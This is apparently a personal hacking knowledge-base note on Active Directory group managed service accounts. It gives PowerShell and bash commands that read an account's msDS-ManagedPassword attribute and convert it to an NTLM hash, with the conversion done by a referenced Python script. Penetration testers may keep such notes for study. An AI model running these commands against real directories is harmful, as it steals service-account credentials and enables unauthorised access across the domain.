# active directory  GMSA group managed service account read NTLM hash with powershell + python
```powershell
$gmsa = Get-ADServiceAccount -Identity GMSAccount -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
echo $mp
```
```bash
# managed_password is the output of `echo $mp`
cat managed_password | awk '{ printf("%.2x", $1) }' > managed_password.hex
~/kb/hacking/windows/convert-msds-managed-password-to-ntlm-hash.py
```

# References
- [20221003151134](/zet/20221003151134/README.md) active directory  GMSA group managed service account
- ~/kb/hacking/windows/windows-active-directory-and-privilege-information.md

Tags:
    #assorted
